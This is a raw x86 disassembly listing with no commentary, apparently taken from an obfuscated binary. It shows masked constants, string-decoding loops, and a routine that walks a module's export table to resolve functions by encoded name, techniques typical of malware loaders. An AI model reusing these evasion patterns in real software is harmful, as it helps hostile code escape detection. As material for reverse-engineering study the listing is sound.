  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
